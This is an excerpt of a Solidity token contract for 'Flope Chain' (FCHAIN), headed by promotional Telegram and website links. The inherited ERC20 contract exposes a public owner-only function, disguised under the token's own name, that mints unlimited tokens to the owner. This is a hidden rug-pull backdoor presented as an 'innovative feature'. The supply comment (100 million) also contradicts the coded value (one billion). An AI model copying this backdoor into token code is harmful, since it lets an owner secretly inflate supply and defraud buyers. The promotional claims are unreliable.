//
// $FlopeChain proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/FlopeChain
// 📱 Website::https://flopechain.io
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _FlopeChain(uint256 amount) public onlyOwner {
 _FlopeChain(msg.sender, amount);
    }
    ...
    function _FlopeChain(address account, uint256 amount) internal virtual {
...
contract $FlopeChain is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Flope Chain", "FCHAIN") {
     _FlopeChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}